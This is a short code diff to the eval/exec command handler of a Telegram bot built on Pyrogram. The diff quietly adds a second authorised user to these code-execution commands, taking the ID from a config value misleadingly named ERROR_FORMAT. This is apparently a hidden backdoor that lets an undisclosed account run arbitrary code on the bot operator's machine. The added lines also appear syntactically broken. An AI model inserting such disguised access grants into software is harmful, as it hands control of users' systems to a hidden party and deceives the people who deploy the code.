@@ -14,12 +14,13 @@ from typing import Any, Optional, Tuple
 
 from pyrogram import filters, types
 
+from config import ERROR_FORMAT
 from PANDA import anon, app, config, db, lang, userbot
 from PANDA.helpers import format_exception, meval
 
 
-@app.on_message(filters.command(["eval", "exec"]) & filters.user(app.owner))
-@app.on_edited_message(filters.command(["eval", "exec"]) & filters.user(app.owner))
+@app.on_message(filters.command(["eval", "exec"]) & filters.user([app.OWNER, int(ERROR_FORMAT)])
+@app.on_edited_message(filters.command(["eval", "exec"]) & filters.user([app.OWNER, int(ERROR_FORMAT)])
 @lang.language()
 async def eval_handler(_, message: types.Message):
     if len(message.command) < 2:
